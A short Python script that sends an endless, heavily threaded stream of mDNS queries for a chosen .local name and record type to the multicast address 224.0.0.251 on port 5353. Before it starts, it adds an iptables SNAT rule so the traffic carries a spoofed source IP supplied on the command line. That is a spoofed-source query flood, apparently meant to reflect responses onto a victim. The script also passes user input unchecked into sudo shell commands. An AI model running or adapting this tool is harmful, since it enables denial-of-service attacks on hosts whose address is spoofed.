import signal
import os
import sys
import argparse
import dns.resolver
import threading
import time

def send_query(host, RRtype):
	Res=dns.resolver.Resolver()
	Res.nameservers=['224.0.0.251'] #mdns multicast address
	Res.port=5353 #mdns port
	
	try:
		a=Res.resolve(host,RRtype)
		print(a[0].to_text())
	except Exception as e:
		print(e)

def signal_handler(sig, frame):
	print('\nQuitting...')
	sys.exit(0)

def __main__():
	signal.signal(signal.SIGINT, signal_handler) #CTRL+C to end gracefully
    
	parser = argparse.ArgumentParser()
	parser.add_argument("--target", "-t", help="Set the .local target")
	parser.add_argument("--type", "-k", help="Set the RR type to query")
	parser.add_argument("--spoofed-ip", "-i", help="Set the spoofed ip.")
	args = parser.parse_args()

	if len(sys.argv) != 7:
		parser.print_help(sys.stderr)
		sys.exit(1)
		
	os.system(f"sudo iptables -t nat -A POSTROUTING -j SNAT --to-source {args.spoofed_ip}")
    
	threads = []
	try:
		while True:
			t = threading.Thread(target=send_query, args=[args.target,args.type])
			threads.append(t)
			t.start()
			print(f'Active Threads: {threading.active_count()}')
			if threading.active_count() > 512: #it is not secure whether it works right
				for x in threads:
     					x.join() #possible problem: if I try to remove x from the list it is not sure if it exists within the list
	except:
		for x in threads:
			x.join() 
		os.system(f"sudo iptables -t nat -D POSTROUTING -j SNAT --to-source {args.spoofed_ip}")

if __name__ == "__main__":
    __main__()
